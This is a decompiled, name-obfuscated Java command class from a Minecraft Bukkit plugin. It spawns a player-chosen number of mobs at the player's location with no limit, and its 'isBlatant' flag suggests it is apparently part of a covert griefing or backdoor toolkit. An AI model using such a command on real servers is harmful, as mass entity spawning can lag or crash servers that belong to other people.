/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.apache.commons.lang.StringUtils
 *  org.bukkit.Bukkit
 *  org.bukkit.Location
 *  org.bukkit.entity.EntityType
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SpamsummonCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIlIIlIIlIlIIlllIl, String lllllllllllllIlIlIIlIIlIlIIlllII, String[] lllllllllllllIlIlIIlIIlIlIIllIll, Player lllllllllllllIlIlIIlIIlIlIIlIlll) {
        if (lllllllllllllIlIlIIlIIlIlIIllIll.length == 3) {
            if (!StringUtils.isNumeric((String)lllllllllllllIlIlIIlIIlIlIIllIll[1])) {
                lllllllllllllIlIlIIlIIlIlIIlIlll.sendMessage(Settings.PREFIX("The amount you put is not a number."));
            } else {
                int lllllllllllllIlIlIIlIIlIlIlIIIlI = Integer.parseInt(lllllllllllllIlIlIIlIIlIlIIllIll[1]);
                int lllllllllllllIlIlIIlIIlIlIlIIIIl = lllllllllllllIlIlIIlIIlIlIlIIIlI + 1;
                Location lllllllllllllIlIlIIlIIlIlIlIIIII = lllllllllllllIlIlIIlIIlIlIIlIlll.getLocation().getBlock().getRelative(0, 1, 0).getLocation();
                EntityType lllllllllllllIlIlIIlIIlIlIIlllll = EntityType.valueOf((String)lllllllllllllIlIlIIlIIlIlIIllIll[2].toUpperCase());
                try {
                    for (int lllllllllllllIlIlIIlIIlIlIlIIlII = 0; lllllllllllllIlIlIIlIIlIlIlIIlII < lllllllllllllIlIlIIlIIlIlIlIIIIl; ++lllllllllllllIlIlIIlIIlIlIlIIlII) {
                        Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)lllllllllllllIlIlIIlIIlIlIIlllIl, () -> lllllllllllllIlIlIIlIIlIlIIlIlll.getWorld().spawnEntity(lllllllllllllIlIlIIlIIlIlIlIIIII, lllllllllllllIlIlIIlIIlIlIIlllll));
                    }
                    lllllllllllllIlIlIIlIIlIlIIlIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Spam Summoned ").append((Object)lllllllllllllIlIlIIlIIlIlIIlllll).append(" at your head location!"))));
                }
                catch (Exception lllllllllllllIlIlIIlIIlIlIlIIIll) {
                    lllllllllllllIlIlIIlIIlIlIlIIIll.printStackTrace();
                    lllllllllllllIlIlIIlIIlIlIIlIlll.sendMessage(Settings.PREFIX("That mob doesn't exist!"));
                }
            }
        } else {
            lllllllllllllIlIlIIlIIlIlIIlIlll.sendMessage(Settings.USAGE("Spamsummon <amount> <mob>"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public SpamsummonCommand() {
        SpamsummonCommand lllllllllllllIlIlIIlIIlIlIlIlllI;
    }
}

